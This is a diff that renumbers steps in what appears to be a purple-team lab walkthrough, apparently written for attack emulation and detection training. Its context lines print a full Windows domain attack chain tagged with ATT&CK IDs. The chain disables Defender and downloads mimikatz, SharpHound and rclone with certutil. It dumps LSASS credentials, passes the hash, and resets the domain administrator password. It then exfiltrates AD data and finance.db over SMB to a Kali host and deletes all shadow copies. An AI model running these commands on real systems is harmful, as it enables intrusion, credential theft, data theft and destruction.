@@ -28,7 +28,7 @@ Since this is an assumed-breach scenario, we already have credentials for a loca
 
 Let's RDP in and have a look around
 
-**Step 1.2**
+**Step 1**
 ```bash
 [KALI:bash] xfreerdp /u:PurpleUser /p:SecurePwd123 /v:10.0.1.15 /cert-ignore
 ```
@@ -40,7 +40,7 @@ Now that we are on the system, we need to get a better understanding what this s
 
 Let's check our permissions and get information about the system. Are we admins? Is system domain-joined?
 
-**Step 1.3**
+**Step 2**
 ```PowerShell
 [ITSERVER:PowerShell] whoami /all
 [ITSERVER:PowerShell] systeminfo
@@ -49,7 +49,7 @@ ATT&CK Techniques: `T1033` `T1082` `T1059.001` (PowerShell T1059.001 will not be
 
 Who else is logged in on the system?
 
-**Step 1.4**
+**Step 3**
 ```PowerShell
 [ITSERVER:PowerShell] quser
 ```
@@ -57,7 +57,7 @@ ATT&CK Techniques: `T1033` `T1082`
 
 Who are administrators on this system?
 
-**Step 1.5**
+**Step 4**
 ```PowerShell
 [ITSERVER:PowerShell] net localgroup administrators
 ```
@@ -65,7 +65,7 @@ ATT&CK Techniques: `T1069.001`
 
 What processes are running? Are there any monitoring tools running on the system?
 
-**Step 1.6**
+**Step 5**
 ```PowerShell
 [ITSERVER:PowerShell] Get-Process | Select -Unique ProcessName
 ```
@@ -73,7 +73,7 @@ ATT&CK Techniques: `T1057`
 
 Is Windows Defender running?
 
-**Step 1.7**
+**Step 6**
 ```PowerShell
 [ITSERVER:PowerShell] Get-MpComputerStatus
 ```
@@ -86,7 +86,7 @@ We see that we have admin privileges on this system, let's disable some security
 Let's disable a bunch of useful things in Windows Defender.
 We can turn off realtime monitoring (which includes antivirus), behavior monitoring, script scanning, and blocking at first sight.
 
-**Step 1.14**
+**Step 7**
 ```PowerShell
 [ITSERVER:PowerShell] Set-MpPreference -DisableRealtimeMonitoring 1
 [ITSERVER:PowerShell] Set-MpPreference -DisableBehaviorMonitoring 1
@@ -105,7 +105,7 @@ Let's use a popular tool `mimikatz` to dump locally cached credentails and get a
 
 We can transfer the tool using `certutil`
 
-**Step 1.15**
+**Step 8**
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
 ```
@@ -113,7 +113,7 @@ ATT&CK Techniques: `T1005`
 
 And then execute it to dump the credentials from LSASS process
 
-**Step 1.16**
+**Step 9**
 ```PowerShell
 [ITSERVER:PowerShell] C:\temp\m.exe
 
@@ -128,7 +128,7 @@ You should be able to see the NTLM hash of `billh` domain user and can now use i
 
 While still in `mimikatz` we can use that hash of the domain user (`ATTACKRANGE\billh`) in an Pass-the-Hash attack to start a PowerShell with a Kerberos ticket belonging to that user (i.e. impersonate that user).
 
-**Step 2.1**
+**Step 10**
 ```PowerShell
 [ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell
 ```
@@ -143,7 +143,7 @@ Let's use popular tool called `Bloodhound` to gather the data and then visualize
 
 We can download the data collector with `certutil` as before
 
-**Step 2.2**
+**Step 11**
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/SharpHound.exe C:\Temp\sh.exe
 ```
@@ -151,7 +151,7 @@ ATT&CK Techniques: `T1005`
 
 And then run it to collect all data about the domain, its users, computers, groups and their privileges
 
-**Step 2.3**
+**Step 12**
 ```PowerShell
 [ITSERVER:PowerShell] C:\temp\sh.exe --memcache --zipfilename c.zip --outputdirectory C:\temp\
 ```
@@ -163,7 +163,7 @@ To exfiltrate the AD data collection, we will use `rclone`.
 
 Let's download `rclone` executable on the system first:
 
-**Step 2.4**
+**Step 13**
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
@@ -171,7 +171,7 @@ ATT&CK Techniques: `T1005`
 
 Then we'll need to create a config file for `rclone` and put it in `C:\Temp\r.conf`:
 
-**Step 2.5**
+**Step 14**
 ```
 [ss]
 type = smb
@@ -190,7 +190,7 @@ In the meantime, on our Kali machine, we will create a `loot` folder and start a
 
 Now that SMB server is running and our `rclone` is ready, let's copy the AD dump file from Windows to Kali:
 
-**Step 2.6**
+**Step 15**
 ```PowerShell
 [ITSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest
 ```
@@ -224,7 +224,7 @@ Let's go back to our compromised system with a compromised AD user and follow th
 In order to convienently run Active Directory commands, let's import Active Directory PowerShell module.
 Usually it comes with RSAT AD tools, but we can also get it directly from the Microsoft DLL. Let's download it with `certutil` and import it
 
-**Step 2.7**
+**Step 16**
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/PowerShellActiveDirectory.dll C:\Temp\a.dll
 [ITSERVER:PowerShell] Import-Module C:\Temp\a.dll
@@ -233,7 +233,7 @@ ATT&CK Techniques: `T1005`
 
 `GenericWrite` persmissions that we have on our compormised account mean that we can add ourselves to the `ITSupport` group. Let's do that!
 
-**Step 2.8**
+**Step 17**
 ```PowerShell
 [ITSERVER:PowerShell] Add-ADGroupMember -Identity "ITSupport" -Members "billh"
 ```
@@ -243,7 +243,7 @@ Great! We now have `AllExtendedRights` over all other users including domain adm
 
 You will need to close the current PowerShell window and open it again from `mimikatz` to make sure the new group membership is activated. Don't forget to also re-import `a.dll`. After that, let's reset domain administrator's password.
 
-**Step 2.9**
+**Step 18**
 ```PowerShell
 [ITSERVER:PowerShell] Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset
 ```
@@ -254,7 +254,7 @@ Done! We changed the password of the Domain Admin to the one of our choice and h
 
 With Domain Admin privileges we can now finally log into the 3rd server.
 
-**Step 3.1**
+**Step 19**
 ```bash
 [KALI:bash] xfreerdp /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert-ignore
 ```
@@ -264,7 +264,7 @@ Let's now exfiltrate them over `rclone` similarly to Part 2.
 
 But let's do one more quick additional step and disable Realtime Monitoring in Windows Defender on this system because it might complain about `rclone`:
 
-**Step 3.2**
+**Step 20**
 ```PowerShell
 [FINSERVER:PowerShell] Set-MpPreference -DisableRealtimeMonitoring 1
 ```
@@ -272,7 +272,7 @@ ATT&CK Techniques: `T1562.001`
 
 We can now download the `rclone` executable:
 
-**Step 3.3**
+**Step 21**
 ```PowerShell
 [FINSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
@@ -280,7 +280,7 @@ ATT&CK Techniques: `T1005`
 
 And create a config file `C:\Temp\r.conf`:
 
-**Step 3.4**
+**Step 22**
 ```
 [ss]
 type = smb
@@ -298,7 +298,7 @@ Then we start the SMB server on Kali:
 
 And finally we exfiltrate the files that we want:
 
-**Step 3.5**
+**Step 23**
 ```PowerShell
 [FINSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\Administrator\Documents\finance.db ss:data --no-check-dest
 ```
@@ -306,7 +306,7 @@ ATT&CK Techniques: `T1048`
 
 Having exfiltrated the files, let's delete them and all shadow copies using `vssadmin` on the system to prevent the files to be restored:
 
-**Step 3.6**
+**Step 24**
 ```PowerShell
 [FINSERVER:PowerShell] rm C:\Users\Administrator\Documents\finance.db
 [FINSERVER:PowerShell] vssadmin.exe delete shadows /all
